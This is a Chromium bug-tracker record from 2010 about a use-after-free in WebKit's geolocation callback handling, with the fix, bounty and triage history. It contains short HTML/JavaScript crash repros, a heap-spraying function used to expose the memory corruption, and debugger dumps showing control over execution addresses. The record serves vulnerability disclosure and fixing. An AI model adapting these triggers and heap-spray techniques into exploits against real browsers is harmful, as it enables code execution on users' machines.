# Security: WebKit: WebCore::GeolocationService::positionChanged use after free

| Field | Value |
|-------|-------|
| **Issue ID** | [40082625](https://issues.chromium.org/issues/40082625) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>Geolocation |
| **Reporter** | ku...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2010-08-10 |
| **Bounty** | $1,000.00 |

## Description

index.htm
================
<META HTTP-EQUIV="refresh" CONTENT="0;url=index.htm""> 
<iframe src="k.htm" width="800" height="600"></iframe> 

k.htm
================
<script> 
window.navigator.geolocation.getCurrentPosition(window.captureEvents)
window.navigator.geolocation.getCurrentPosition(null)
//setInterval("location.reload()",1);
</script> 

put index.htm 127.0.0.1
then viste http://127.0.0.1
crash 

## Attachments

- [GeolocationDispatcher..OnGeolocationPositionUpdated ReadAV@NULL (bf79368734d60c6546b4b60cdb880d11).html](attachments/GeolocationDispatcher..OnGeolocationPositionUpdated ReadAV@NULL (bf79368734d60c6546b4b60cdb880d11).html) (text/html; charset=us-ascii, 322.2 KB)
- [[unknown] in WebCore..GeolocationService..positionChanged ExecAV@Arbitrary (c7a2946e8650aaf22c0d7749ecf19909).html](attachments/[unknown] in WebCore..GeolocationService..positionChanged ExecAV@Arbitrary (c7a2946e8650aaf22c0d7749ecf19909).html) (text/html; charset=us-ascii, 354.1 KB)
- [[unknown] in GeolocationDispatcher..OnGeolocationPositionUpdated ExecAV@NULL (482e3a8f8d81c85ae9d15e7bd1251ebc).html](attachments/[unknown] in GeolocationDispatcher..OnGeolocationPositionUpdated ExecAV@NULL (482e3a8f8d81c85ae9d15e7bd1251ebc).html) (text/html; charset=us-ascii, 320.9 KB)
- [[unknown] in WebCore..GeolocationService..positionChanged ExecAV@NULL (c7a2946e8650aaf22c0d7749ecf19909).html](attachments/[unknown] in WebCore..GeolocationService..positionChanged ExecAV@NULL (c7a2946e8650aaf22c0d7749ecf19909).html) (text/html; charset=us-ascii, 354.8 KB)
- [WebCore..GeolocationService..positionChanged ReadAV@Arbitrary (e31442001d038f64dd61433e0387907f).html](attachments/WebCore..GeolocationService..positionChanged ReadAV@Arbitrary (e31442001d038f64dd61433e0387907f).html) (text/html; charset=us-ascii, 359.0 KB)
- [output.txt](attachments/output.txt) (text/x-c; charset=us-ascii, 5.1 KB)
- [output.txt](attachments/output_53393877.txt) (text/x-c++; charset=utf-8, 3.9 KB)

## Timeline

### ku...@gmail.com (2010-08-10)

(adc.f98): Access violation - code c0000005 (!!! second chance !!!)
eax=0050ebc0 ebx=02aa55f4 ecx=02a7d700 edx=65636341 esi=0050ebc0 edi=69555b54
eip=68c2e6f8 esp=001ded6c ebp=001dede8 iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
chrome_681f0000!WebCore::GeolocationService::positionChanged+0x8:
68c2e6f8 8b4204          mov     eax,dword ptr [edx+4] ds:002b:65636345=????????
0:000> .exr -1
ExceptionAddress: 68c2e6f8 (chrome_681f0000!WebCore::GeolocationService::positionChanged+0x00000008)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 65636345
Attempt to read from address 65636345

### ku...@gmail.com (2010-08-10)

[Comment Deleted]

### ku...@gmail.com (2010-08-10)


0:000> kP
ChildEBP RetAddr  
001ded6c 68c43987 chrome_681f0000!WebCore::GeolocationService::positionChanged(void)+0x8 [c:\b\slave\chromium-rel-xp\build\src\third_party\webkit\webcore\platform\geolocationservice.cpp @ 74]
001ded74 68c795e3 chrome_681f0000!WebCore::GeolocationServiceChromium::setLastPosition(
			class WTF::PassRefPtr<WebCore::Geoposition> geoposition = class WTF::PassRefPtr<WebCore::Geoposition>)+0x17 [c:\b\slave\chromium-rel-xp\build\src\third_party\webkit\webcore\platform\chromium\geolocationservicechromium.cpp @ 55]
001dede8 683a7aa1 chrome_681f0000!WebKit::WebGeolocationServiceBridgeImpl::setLastPosition(
			double latitude = 36.585422999999999, 
			double longitude = 109.489634, 
			bool providesAltitude = false, 
			double altitude = -10000, 
			double accuracy = 140000, 
			bool providesAltitudeAccuracy = false, 
			double altitudeAccuracy = -1, 
			bool providesHeading = false, 
			double heading = -1, 
			bool providesSpeed = false, 
			double speed = -1, 
			int64 timestamp = 1281426857721)+0xd3 [c:\b\slave\chromium-rel-xp\build\src\third_party\webkit\webkit\chromium\src\webgeolocationservicebridgeimpl.cpp @ 162]
001def28 683a7b91 chrome_681f0000!GeolocationDispatcher::OnGeolocationPositionUpdated(
			struct Geoposition * geoposition = 0x001def40)+0x171 [c:\b\slave\chromium-rel-xp\build\src\chrome\renderer\geolocation_dispatcher.cc @ 105]
001defa0 683a7ce3 chrome_681f0000!IPC::MessageWithTuple<Tuple1<Geoposition> >::Dispatch<GeolocationDispatcher,void (
			class IPC::Message * msg = 0x00000000, 
			class GeolocationDispatcher * obj = 0x00410408, 
			<function> * func = 0x00000000)+0x41 [c:\b\slave\chromium-rel-xp\build\src\ipc\ipc_message_utils.h @ 1050]
001defc4 68384df4 chrome_681f0000!GeolocationDispatcher::OnMessageReceived(
			class IPC::Message * message = 0x00000000)+0x43 [c:\b\slave\chromium-rel-xp\build\src\chrome\renderer\geolocation_dispatcher.cc @ 33]
001df084 6880da00 chrome_681f0000!RenderView::OnMessageReceived(
			class IPC::Message * message = 0x00000000)+0xd4 [c:\b\slave\chromium-rel-xp\build\src\chrome\renderer\render_view.cc @ 650]
001df094 6880d9bc chrome_681f0000!MessageRouter::RouteMessage(
			class IPC::Message * msg = 0x00000000)+0x30 

### ku...@gmail.com (2010-08-10)

[c:\b\slave\chromium-rel-xp\build\src\chrome\common\message_router.cc @ 40]
001df0a4 6880b46c chrome_681f0000!MessageRouter::OnMessageReceived(
			class IPC::Message * msg = 0x00000000)+0x2c [c:\b\slave\chromium-rel-xp\build\src\chrome\common\message_router.cc @ 31]
001df0b8 68610c67 chrome_681f0000!ChildThread::OnMessageReceived(
			class IPC::Message * msg = 0x00000000)+0x8c [c:\b\slave\chromium-rel-xp\build\src\chrome\common\child_thread.cc @ 146]
001df0c4 683163cf chrome_681f0000!RunnableMethod<CancelableRequest<CallbackRunner<Tuple0> >,void (void)+0x17 [c:\b\slave\chromium-rel-xp\build\src\base\task.h @ 327]
001df178 68317236 chrome_681f0000!MessageLoop::RunTask(
			class Task * task = 0x00000000)+0xff [c:\b\slave\chromium-rel-xp\build\src\base\message_loop.cc @ 410]
001df1a8 6832ae27 chrome_681f0000!MessageLoop::DoWork(void)+0x176 [c:\b\slave\chromium-rel-xp\build\src\base\message_loop.cc @ 525]
001df264 683168c2 chrome_681f0000!base::MessagePumpDefault::Run(
			class base::MessagePump::Delegate * delegate = 0x001df464)+0x117 [c:\b\slave\chromium-rel-xp\build\src\base\message_pump_default.cc @ 50]
001df304 683179bb chrome_681f0000!MessageLoop::RunInternal(void)+0x92 [c:\b\slave\chromium-rel-xp\build\src\base\message_loop.cc @ 257]
001df31c 6834b184 chrome_681f0000!MessageLoop::Run(void)+0x5b [c:\b\slave\chromium-rel-xp\build\src\base\message_loop.cc @ 208]
001df57c 681f8e78 chrome_681f0000!RendererMain(
			struct MainFunctionParams * parameters = <Memory access error>)+0x314 [c:\b\slave\chromium-rel-xp\build\src\chrome\renderer\renderer_main.cc @ 292]
001df720 010e50d9 chrome_681f0000!ChromeMain(
			struct HINSTANCE__ * instance = <Memory access error>, 
			union sandbox::SandboxInterfaceInfo * sandbox_info = <Memory access error>, 
			wchar_t * command_line = <Memory access error>)+0x8d8 [c:\b\slave\chromium-rel-xp\build\src\chrome\app\chrome_dll_main.cc @ 786]
001df79c 010e5577 chrome!MainDllLoader::Launch(
			struct HINSTANCE__ * instance = 0x00000003, 
			union sandbox::SandboxInterfaceInfo * sbox_info = 0x00000004)+0x199 [c:\b\slave\chromium-rel-xp\build\src\chrome\app\client_util.cc @ 241]
001df7f4 01116200 chrome!wWinMain(
			struct HINSTANCE__ * instance = 0x75ab3677, 
			struct HINSTANCE__ * __formal = 0x7efde000, 
			wchar_t * __formal = 0x001df8d0 "???", 
			int __formal = 1997774146)+0x97 [c:\b\slave\chromium-rel-xp\build\src\chrome\app\chrome_exe_main.cc @ 47]


### ku...@gmail.com (2010-08-10)

crash need click allow or allow Geolocation default

### sk...@chromium.org (2010-08-10)

I can reproduce. I think the geolocation code is not considering that the window object it was called from may get deleted or it's callback function may be a method of a deleted window object. When the callback is made, the window object (or the captureEvents method) is probably used-after-free. See https://crbug.com/chromium/50842 for a similar problem in geolocation code.

Having the memory corruption show up may be easier by calling this function in k.htm after the gelocation calls and running chrome with --js-flags="--expose-gc":
  function heap_corrupt() {
    console.log('heap corrupted');
    var a = [];
    for(var si = 0; si < 0x100; si++) {
      try { a.push(new WebGLByteArray(si)) } catch (e) {}
      a.push(new Array(si).join('A'));
    }
    for (var li = 0x200; li < 0x10000; li <<= 1) {
      try { a.push(new WebGLByteArray(li)); } catch (e) {}
      a.push(new Array(li).join('A'));
    }
    delete a;
    try { gc(); } catch (e) {};
  }

id:             [unknown] in WebCore::GeolocationService::positionChanged ExecAV@NULL (c7a2946e8650aaf22c0d7749ecf19909)
description:    Security: Attempt to execute non-executable NULL pointer (+0xC) in [unknown] in WebCore::GeolocationService::positionChanged
stack:          [unknown]
                WebCore::GeolocationService::positionChanged
                WebCore::GeolocationServiceChromium::setLastPosition
                WebKit::WebGeolocationServiceBridgeImpl::setLastPosition
                GeolocationDispatcher::OnGeolocationPositionUpdated
                IPC::MessageWithTuple<...>
                GeolocationDispatcher::OnMessageReceived
                RenderView::OnMessageReceived
                MessageRouter::RouteMessage
                MessageRouter::OnMessageReceived
                ChildThread::OnMessageReceived
                ...

id:             GeolocationDispatcher::OnGeolocationPositionUpdated ReadAV@NULL (bf79368734d60c6546b4b60cdb880d11)
description:    Attempt to read from NULL pointer (+0x7D) in GeolocationDispatcher::OnGeolocationPositionUpdated
stack:          GeolocationDispatcher::OnGeolocationPositionUpdated
                IPC::MessageWithTuple<...>
                GeolocationDispatcher::OnMessageReceived
                RenderView::OnMessageReceived
                MessageRouter::RouteMessage
                MessageRouter::OnMessageReceived
                ...

id:             [unknown] in GeolocationDispatcher::OnGeolocationPositionUpdated ExecAV@NULL (482e3a8f8d81c85ae9d15e7bd1251ebc)
description:    Security: Attempt to execute non-executable NULL pointer (+0xC) in [unknown] in GeolocationDispatcher::OnGeolocationPositionUpdated
stack:          [unknown]
                GeolocationDispatcher::OnGeolocationPositionUpdated
                IPC::MessageWithTuple<...>
                GeolocationDispatcher::OnMessageReceived
                RenderView::OnMessageReceived
                MessageRouter::RouteMessage
                MessageRouter::OnMessageReceived
                ChildThread::OnMessageReceived
                ...

### sk...@chromium.org (2010-08-10)

Upstream: https://bugs.webkit.org/show_bug.cgi?id=43776

### js...@chromium.org (2010-08-10)

+bulach@ - because I CC'd him on the upstream bug.


### js...@chromium.org (2010-08-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-08-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-08-10)

https://crbug.com/chromium/51655 is very similar to this bug. I was originally going to dupe it in here and note that it was reported first. However, I'm not sure yet if they're the same root cause.


### js...@chromium.org (2010-08-11)

Steve, it looks like the upstream patch <https://bugs.webkit.org/show_bug.cgi?id=39879> should address this case and https://crbug.com/chromium/51655. Can you take a look and try to get that patch landed?


### st...@google.com (2010-08-11)

My patch for https://bugs.webkit.org/show_bug.cgi?id=39879 got put on hold because of complications with how Geolocation interacts with the back/forward cache. We're planning to refactor Geolocation and the plan was to fix this bug as part of the refactoring. However, now we have a repro case for this bug, we should probably make a temporary fix. I'll investigate getting my patch landed.

Can you close https://bugs.webkit.org/show_bug.cgi?id=43776 as a duplicate of https://bugs.webkit.org/show_bug.cgi?id=39879 ?

### js...@chromium.org (2010-08-11)

[Empty comment from Monorail migration]

### js...@chromium.org (2010-08-11)

Steve, thanks for handling this. I closed the duplicate upstream bug and our local https://crbug.com/chromium/51655. I'll track this bug and upstream so we know when to merge to stable and beta.

Just for convenience, here's the repro from https://crbug.com/chromium/51655:

<script>
window.navigator.geolocation.watchPosition(document.write)
window.navigator.geolocation.clearWatch()
setInterval('location.reload()',1)
</script>


### in...@chromium.org (2010-08-13)

Needs to be merged to both 472, 375. Also, need to verify all the kuzzcc testcases.

Main fix in
Committed r65329: <http://trac.webkit.org/changeset/65329>

Layouttest in 
Committed r65325: <http://trac.webkit.org/changeset/65325>

### bu...@gmail.com (2010-08-17)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=56366 

------------------------------------------------------------------------
r56366 | inferno@chromium.org | 2010-08-17 09:31:27 -0700 (Tue, 17 Aug 2010) | 35 lines
Changed paths:
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/dom/Geolocation/disconnected-frame-already-expected.txt
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/dom/Geolocation/disconnected-frame-already.html
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/dom/Geolocation/resources/disconnected-frame-already-inner1.html
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/dom/Geolocation/resources/disconnected-frame-already-inner2.html
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/fast/dom/Geolocation/script-tests/disconnected-frame-already.js
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/472/LayoutTests/platform/gtk/Skipped?r1=56366&r2=56365
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/472/WebCore/page/Geolocation.cpp?r1=56366&r2=56365

Merge 65329 - 2010-08-13  Steve Block  <steveblock@google.com>

        Reviewed by Alexey Proskuryakov.

        Geolocation activity started after frame has been disconnected can cause crash
        https://bugs.webkit.org/show_bug.cgi?id=39879

        New requests started after the Frame has been disconnected are ignored. We do
        not invoke the error callback as this would allow buggy or malicious pages to
        hose the CPU. Such a page could hold a reference to a Geolocation object from
        a since closed Page and register new requests from the error callback to
        create an infinite loop.

        Tests: fast/dom/Geolocation/disconnected-frame-already.html

        * page/Geolocation.cpp:
2010-08-13  Steve Block  <steveblock@google.com>

        Reviewed by Alexey Proskuryakov.

        Geolocation activity started after frame has been disconnected can cause crash
        https://bugs.webkit.org/show_bug.cgi?id=39879

        Added new tests to GTK skipped list.

        * fast/dom/Geolocation/disconnected-frame-already.html: Added.
        * fast/dom/Geolocation/disconnected-frame-already-expected.txt: Added.
        * fast/dom/Geolocation/script-tests/disconnected-frame-already.js: Added.
        * fast/dom/Geolocation/resources/disconnected-frame-already-inner1.html: Added.
        * fast/dom/Geolocation/resources/disconnected-frame-already-inner2.html: Added.
        * platform/gtk/Skipped:

BUG=51670

Review URL: http://codereview.chromium.org/3134016
------------------------------------------------------------------------


### bu...@gmail.com (2010-08-17)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=56368 

------------------------------------------------------------------------
r56368 | inferno@chromium.org | 2010-08-17 09:34:48 -0700 (Tue, 17 Aug 2010) | 35 lines
Changed paths:
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/375/LayoutTests/fast/dom/Geolocation/disconnected-frame-already-expected.txt
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/375/LayoutTests/fast/dom/Geolocation/disconnected-frame-already.html
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/375/LayoutTests/fast/dom/Geolocation/resources/disconnected-frame-already-inner1.html
   A http://src.chromium.org/viewvc/chrome/branches/WebKit/375/LayoutTests/fast/dom/Geolocation/resources/disconnected-frame-already-inner2.html
   M http://src.chromium.org/viewvc/chrome/branches/WebKit/375/WebCore/page/Geolocation.cpp?r1=56368&r2=56367

Merge 65329 - 2010-08-13  Steve Block  <steveblock@google.com>

        Reviewed by Alexey Proskuryakov.

        Geolocation activity started after frame has been disconnected can cause crash
        https://bugs.webkit.org/show_bug.cgi?id=39879

        New requests started after the Frame has been disconnected are ignored. We do
        not invoke the error callback as this would allow buggy or malicious pages to
        hose the CPU. Such a page could hold a reference to a Geolocation object from
        a since closed Page and register new requests from the error callback to
        create an infinite loop.

        Tests: fast/dom/Geolocation/disconnected-frame-already.html

        * page/Geolocation.cpp:
2010-08-13  Steve Block  <steveblock@google.com>

        Reviewed by Alexey Proskuryakov.

        Geolocation activity started after frame has been disconnected can cause crash
        https://bugs.webkit.org/show_bug.cgi?id=39879

        Added new tests to GTK skipped list.

        * fast/dom/Geolocation/disconnected-frame-already.html: Added.
        * fast/dom/Geolocation/disconnected-frame-already-expected.txt: Added.
        * fast/dom/Geolocation/script-tests/disconnected-frame-already.js: Added.
        * fast/dom/Geolocation/resources/disconnected-frame-already-inner1.html: Added.
        * fast/dom/Geolocation/resources/disconnected-frame-already-inner2.html: Added.
        * platform/gtk/Skipped:

BUG=51670

Review URL: http://codereview.chromium.org/3152023
------------------------------------------------------------------------


### sc...@gmail.com (2010-08-17)

@kuzzcc: congrats! We're provisionally rewarding this one at the $1000 level.
- DON'T FORGET to include a title in future reports :)
- Please include the Chrome exact version and operating system.
Reasons we like this report include:
- Two different, simple, reduced repros for the same bug (51655 being the other)
- You included proof of severity with the .exr in https://crbug.com/chromium/51670#c1 (VERY useful!)
- You included a good stack trace in https://crbug.com/chromium/51670#c2 and https://crbug.com/chromium/51670#c3

Please keep doing this for future bug reports and you have good chances of getting the higher rewards due to "high quality report".

### sc...@gmail.com (2010-08-18)

[Empty comment from Monorail migration]

### [Deleted User] (2010-08-18)

Using the testcase with Google Chrome 5.0.375.127 (Official Build 55887), clicking on Allow button of geolocation bar doesn't repro the memory corruption issue but it's crashing some where else.

Stack Trace
-----------
Thread 0 *CRASHED* ( EXCEPTION_ACCESS_VIOLATION_EXEC @ 0x00000000 )

0x0200af3a	 [chrome.dll	 - ipc_message_utils.h:991]	IPC::MessageWithTuple<Tuple1<Geoposition> >::Dispatch<GeolocationDispatcher,void ( GeolocationDispatcher::*)(Geoposition const &)>(IPC::Message const *,GeolocationDispatcher *,void ( GeolocationDispatcher::*)(Geoposition const &))
0x0200a668	 [chrome.dll	 - geolocation_dispatcher.cc:33]	GeolocationDispatcher::OnMessageReceived(IPC::Message const &)
0x01fe89dc	 [chrome.dll	 - render_view.cc:545]	RenderView::OnMessageReceived(IPC::Message const &)
0x0226bf28	 [chrome.dll	 - message_router.cc:40]	MessageRouter::RouteMessage(IPC::Message const &)
0x0226bf02	 [chrome.dll	 - message_router.cc:31]	MessageRouter::OnMessageReceived(IPC::Message const &)
0x0226ac49	 [chrome.dll	 - child_thread.cc:146]	ChildThread::OnMessageReceived(IPC::Message const &)
0x0215dcda	 [chrome.dll	 - task.h:296]	RunnableMethod<CancelableRequest<CallbackRunner<Tuple2<int,history::QueryResults *> > >,void ( CancelableRequest<CallbackRunner<Tuple2<int,history::QueryResults *> > >::*)(Tuple2<int,history::QueryResults *> const &),Tuple1<Tuple2<int,history::QueryResults *> > >::Run()
0x01fc3b02	 [chrome.dll	 - message_loop.cc:329]	MessageLoop::RunTask(Task *)
0x01fc3b3f	 [chrome.dll	 - message_loop.cc:337]	MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const &)
0x01fc3cd5	 [chrome.dll	 - message_loop.cc:444]	MessageLoop::DoWork()
0x01fd3c9e	 [chrome.dll	 - message_pump_default.cc:50]	base::MessagePumpDefault::Run(base::MessagePump::Delegate *)
0x01fc39ad	 [chrome.dll	 - message_loop.cc:205]	MessageLoop::RunInternal()
0x01fc3932	 [chrome.dll	 - message_loop.cc:177]	MessageLoop::RunHandler()
0x01fc38e0	 [chrome.dll	 - message_loop.cc:155]	MessageLoop::Run()
0x01fddd13	 [chrome.dll	 - renderer_main.cc:289]	RendererMain(MainFunctionParams const &)
0x01c33ba5	 [chrome.dll	 - chrome_dll_main.cc:716]	ChromeMain
0x004033d5	 [chrome.exe	 - client_util.cc:195]	MainDllLoader::Launch(HINSTANCE__ *,sandbox::SandboxInterfaceInfo *)
0x00403a5b	 [chrome.exe	 - chrome_exe_main.cc:46]	wWinMain
0x0044655e	 [chrome.exe	 - crt0.c:263]	__tmainCRTStartup
0x7c817076	 [kernel32.dll	 + 0x00017076]	BaseProcessStart

Full report @ http://crash/reportdetail?reportid=e07ad6883237c988

### js...@chromium.org (2010-08-18)

That is a known, non-security bug, which is already fixed on trunk:
https://bugs.webkit.org/show_bug.cgi?id=44096


### st...@google.com (2010-08-18)

> Using the testcase with Google Chrome 5.0.375.127 (Official Build 55887), clicking on Allow button of
> geolocation bar doesn't repro the memory corruption issue but it's crashing some where else.
Which testcase are you referring to it? It looks like this bug has ended up tracking two. The first should be fixed in https://bugs.webkit.org/show_bug.cgi?id=39879, but the second (from https://crbug.com/chromium/51655) was later fixed in https://bugs.webkit.org/show_bug.cgi?id=44096

Are you testing with both of these fixes in place?

### js...@chromium.org (2010-08-18)

QA is currently testing the next 5.x stable update, which doesn't include the test fix for http://webkit.org/b/44096. Stable updates include only fixes for security vulnerabilities and common crashes, and 44096 doesn't fall into either of those categories. So, the crash listed in https://crbug.com/chromium/51670#c20 is expected, and is not a security or stability issue.


### [Deleted User] (2010-08-18)

I'm not sure if the fix for 51655 is merged into 375(.127). I was using the testcase given by inferno which is @ go/51670.html

### js...@chromium.org (2010-08-19)

@sunandt - The testcase you are referring to will crash on 375.127. It is expected behavior. However, it is clean NULL deref in the renderer process, and very obviously not a security issue. The vulnerability triggered prior to 375.127 has been fixed, and the crashing stack is different. You can verify this by testing with the other repro.


### ku...@gmail.com (2010-08-20)

still crash  chrome 5.0.375.127
(aa4.af8): Access violation - code c0000005 (!!! second chance !!!)
eax=8d801cf7 ebx=41400000 ecx=010e9c54 edx=0000012a esi=010e9c54 edi=002ef788
eip=70e4ab62 esp=002ef6e8 ebp=002ef76c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
chrome_70a70000!GeolocationDispatcher::OnGeolocationPositionUpdated+0x11e:
70e4ab62 ff5304          call    dword ptr [ebx+4]    ds:002b:41400004=????????
0:000> .exr -1
ExceptionAddress: 70e4ab62 (chrome_70a70000!GeolocationDispatcher::OnGeolocationPositionUpdated+0x0000011e)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 41400004
Attempt to read from address 41400004


### ku...@gmail.com (2010-08-20)

(8f8.b20): Access violation - code c0000005 (!!! second chance !!!)
eax=0055e644 ebx=00000001 ecx=0055e644 edx=0055e640 esi=0055ad00 edi=02e6a1f0
eip=0055e640 esp=002df07c ebp=002df52c iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
0055e640 3046e7          xor     byte ptr [esi-19h],al      ds:002b:0055ace7=00
0:000> .exr -1
ExceptionAddress: 0055e640
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000008
   Parameter[1]: 0055e640
Attempt to execute non-executable address 0055e640


### in...@chromium.org (2010-08-20)

@kuzzcc, check your chrome version again. many of the clients are still not pushed to the latest patch. also, which reproducer testcase are you using and can you also tell which platform/os you got this crash on.

### ku...@gmail.com (2010-08-20)

Yes chrome 5.0.375.127
and i test chromium 7.0.500.0 (56781) still crash!

### js...@chromium.org (2010-08-20)

I let the test run in a loop for over an hour and couldn't get a repro of this issue on stable or trunk. On stable I consistently see a clean NULL deref crash for the testcase from https://crbug.com/chromium/51655. However, that's expected and I do not see the crash on trunk.

@kuzzcc - Your versions may be out of sync or you may have an issue with your test environment.


### sc...@gmail.com (2010-08-25)

Payment is in the electronic system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### be...@chromium.org (2017-09-22)

[Empty comment from Monorail migration]

[Monorail components: Blink>Geolocation]

### be...@chromium.org (2017-09-22)

[Empty comment from Monorail migration]

[Monorail components: -Blink>Location]

### is...@google.com (2017-09-22)

This issue was migrated from crbug.com/chromium/51670?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>Geolocation]
[Monorail mergedwith: crbug.com/chromium/51655]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082625)*
